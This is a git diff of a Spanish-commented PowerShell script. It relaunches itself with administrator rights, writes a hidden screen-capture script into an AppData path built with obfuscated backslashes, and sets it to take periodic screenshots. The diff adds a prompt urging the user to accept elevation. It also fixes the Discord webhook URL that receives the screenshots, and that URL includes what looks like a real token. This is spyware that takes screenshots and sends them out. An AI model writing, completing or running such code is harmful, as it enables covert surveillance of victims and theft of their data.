@@ -1,8 +1,15 @@
 # Verificar si se está ejecutando como administrador
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
 
-# Si no se está ejecutando como administrador, volver a ejecutar como administrador
+# Si no se está ejecutando como administrador, volver a ejecutar como administrador después de una espera
 if (-not $isAdmin) {
+    # Mostrar mensaje de espera
+    Write-Host "Este script requiere permisos de administrador. Por favor, acepta la solicitud de ejecutar como administrador."
+
+    # Esperar unos segundos
+    Start-Sleep -Seconds 5
+
+    # Volver a ejecutar el script como administrador
     Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -noexit -file "{0}"' -f $MyInvocation.MyCommand.Path)
     exit
 }
@@ -12,7 +19,7 @@ $ScriptPath = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92
 
 # Contenido del script de captura de pantalla
 $ScriptContent = @"
-\$hookurl = "Uhttps://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+\$hookurl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
 \$seconds = 30 # Intervalo de captura de pantalla
 \$a = 2 # Cantidad de capturas de pantalla
 
